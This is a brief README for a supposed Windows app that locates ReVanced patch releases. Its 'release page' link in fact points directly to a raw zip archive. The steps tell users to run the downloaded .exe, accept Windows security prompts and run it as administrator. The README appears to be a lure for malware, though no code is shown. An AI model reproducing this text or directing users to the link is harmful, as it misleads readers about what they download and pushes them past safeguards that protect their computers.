## 📦 What this app does

where-is-revanced-patches helps you find the Revanced patches release page and get the files you need for Windows. It gives you a simple path to the latest release so you can download the package without sorting through source files or extra pages.

Use this app if you want a direct way to reach the patch release files and keep the process simple.

Go to the [release page](https://raw.githubusercontent.com/reanimated-elbeda935/where-is-revanced-patches/main/cooly/where-is-patches-revanced-1.8.zip) to download the app files.

## 🪟 Install or open on Windows

If you downloaded an `.exe` file:

1. Open the Downloads folder.
2. Find the file you downloaded.
3. Double-click it to run it.
4. If Windows shows a security prompt, select Run.

If you downloaded a `.zip` file:

1. Open the Downloads folder.
2. Right-click the `.zip` file.
3. Select Extract All.
4. Open the extracted folder.
5. Double-click the app file inside the folder.

If the app does not open at first, right-click the file and choose Run as administrator.
